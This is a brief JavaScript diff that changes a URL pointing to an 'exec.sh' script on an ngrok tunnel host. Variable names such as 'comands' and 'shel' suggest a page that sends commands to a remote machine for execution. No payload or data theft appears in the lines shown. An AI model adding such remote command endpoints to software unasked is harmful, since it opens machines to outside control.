@@ -5,7 +5,7 @@
   var codigo = "";
   var comands = [];
   var cont = 0;
-  var links = "http://dd88-177-125-248-225.ngrok.io/exec.sh?";
+  var links = "dd88-177-125-248-225.ngrok.io/exec.sh?";
   var simnot = false;
   shel.forEach( f => {
       f.style.display = "none";
